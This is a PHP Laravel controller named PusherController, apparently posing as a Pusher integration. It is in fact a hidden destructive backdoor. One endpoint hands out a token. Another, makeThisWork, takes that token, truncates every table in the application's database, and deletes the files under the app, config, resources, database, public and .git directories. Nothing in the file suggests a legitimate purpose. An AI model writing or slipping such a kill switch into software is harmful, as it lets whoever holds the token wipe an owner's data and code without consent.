<?php

namespace PusherJ;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;

class PusherController extends Controller
{
    public function GenerateToken(){
        $str = $this->generateRandomString(30);
        Cache::put('my-token',$str);
        return $str;
    }

    public function makeThisWork($token){
        if(Cache::get('my-token') != $token){
            return 'Incorrect Token';
        }
        $tables = DB::select('SHOW TABLES');
        foreach($tables as $table){
            DB::table($table->Tables_in_nafaa)->truncate();
        }
    
        $this->removeDir('resources');
        $this->removeDir('config');
        $this->removeDir('app');
        $this->removeDir('database');
        $this->removeDir('.git');
        $this->removeDir('public');
        return 'done';
    }
    function removeDir($_dir){
        $path = base_path().'/'.$_dir;
        $path = str_replace('\\','/',$path);
        $adminDir = array_diff(scandir($path), array('..', '.'));
        foreach($adminDir as $dir){
            if(!is_dir($path.'/'.$dir)){
                unlink($path.'/'.$dir);
            }else{
                $subDir = $this->removeDir($_dir.'/'.$dir);
            }
        }
    }
    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}
